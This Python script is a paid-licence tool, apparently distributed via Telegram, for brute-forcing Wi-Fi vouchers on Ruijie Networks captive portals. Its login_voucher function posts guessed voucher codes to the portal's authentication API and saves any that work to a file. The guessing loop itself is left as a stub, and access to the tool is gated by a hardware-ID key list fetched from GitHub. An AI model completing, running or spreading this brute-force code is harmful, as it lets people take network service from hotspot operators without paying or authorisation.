import os
import re
import sys
import time
import json
import base64
import marshal
import aiohttp
import asyncio
import hashlib
import requests
import argparse
import random
import string
import ntplib
from datetime import datetime

# --- UI COLORS ---
w, g, y, r, b = "\033[1;00m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m"

# --- SECURITY CONFIG ---
DB_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"

def get_hwid():
    try:
        idx = hashlib.md5((str(os.getlogin()) + str(os.getuid())).encode()).hexdigest()[:10].upper()
        return f"MY-{idx}"
    except:
        return "MY-UNKNOWN"

async def check_access():
    my_id = get_hwid()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(DB_URL, timeout=10) as resp:
                if resp.status == 200:
                    content = await resp.text()
                    for line in content.splitlines():
                        if "~" in line:
                            uid, exp = line.split("~")
                            if uid == my_id:
                                # Date Format: DD-MM-YYYY (e.g., 30-12-2026)
                                exp_dt = datetime.strptime(exp, "%d-%m-%Y")
                                if exp_dt > datetime.now():
                                    return True, exp
                                else:
                                    return False, "EXPIRED"
                    return False, "NO_KEY"
                else:
                    return False, "SERVER_ERROR"
    except:
        return False, "CONN_ERROR"

def Line():
    print(f"{y}-" * os.get_terminal_size()[0] + f"{w}")

def Logo(exp_date=None):
    os.system("clear")
    logo = f"""{r}
 ███▄    █▄   ▄██████▄     ▄████████  ▄██   ▄      ▄   
 ███    ███  ███    ███   ███    ███  ███   ██▄   ███  
 ███    ███  ███    ███   ███    █▀   ███▄▄▄███  ███   
 ███    ███  ███    ███  ▄███▄▄▄      ▀▀▀▀▀▀███  ███   
 ███    ███  ███    ███ ▀▀███▀▀▀      ▄██   ███  ███   
 ███    ███  ███    ███   ███    █▄   ███   ███  ███   
 ███    ███  ███    ███   ███    ███  ███   ███  ███   
  ▀      ▀    ▀██████▀    ██████████   ▀█████▀   ████████▀
                                                       
              {g}👨‍💻 Created by Moe Yu {w}|{g} 🚀 Pro Engine v22.0{w}"""
    print(logo)
    Line()
    print(f"{w}[✨] Developer : Moe Yu")
    print(f"{w}[💬] Telegram  : @moeyu")
    print(f"{w}[📢] Channel   : @starlink112")
    if exp_date:
        print(f"{w}[⏳] Expiry    : {g}{exp_date}")
    Line()

# --- CORE LOGIC ---
async def login_voucher(session, session_id, voucher, ip):
    data = {"accessCode": voucher, "sessionId": session_id, "apiVersion": 1}
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    try:
        async with session.post(post_url, json=data) as req:
            res = await req.json()
            if 'logonUrl' in str(res):
                print(f'{g}[SUCCESS] {voucher}{w}')
                with open("success.txt", "a") as f: f.write(voucher + "\n")
                return True
    except: pass
    return False

class VoucherCode:
    def __init__(self, mode, length):
        self.mode = mode
        self.length = length

    async def start(self):
        print(f"{g}[+] Bruteforce စတင်နေပြီ... (Mode: {self.mode}){w}")
        # မူလ Bruteforce logic များကို ဤနေရာတွင် ဆက်လက်လုပ်ဆောင်ပါ
        await asyncio.sleep(1)

async def main():
    # Security Check
    status, info = await check_access()
    
    if status:
        Logo(exp_date=info)
        parser = argparse.ArgumentParser()
        parser.add_argument("-o", "--option", choices=["code", "setup", "internet"], required=True)
        parser.add_argument("-m", "--mode", default="digit")
        parser.add_argument("-l", "--length", type=int, default=6)
        args = parser.parse_args()

        if args.option == "code":
            v = VoucherCode(args.mode, args.length)
            await v.start()
        elif args.option == "setup":
            print(f"{g}[*] Setup ပိုင်း လုပ်ဆောင်နေသည်...{w}")
    else:
        Logo()
        if info == "EXPIRED":
            print(f"{r}[!] သင်၏ Key မှာ သက်တမ်းကုန်ဆုံးသွားပါပြီ။{w}")
        elif info == "NO_KEY":
            print(f"{r}[!] သင်၏ HWID မှာ Register လုပ်ထားခြင်းမရှိပါ။{w}")
            print(f"{y}HWID: {g}{get_hwid()}{w}")
            print(f"{y}ဝယ်ယူရန်: @moeyu{w}")
        else:
            print(f"{r}[!] ချိတ်ဆက်မှု အမှားအယွင်းရှိနေပါသည်။ အင်တာနက်စစ်ပါ။{w}")
        Line()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        sys.exit()
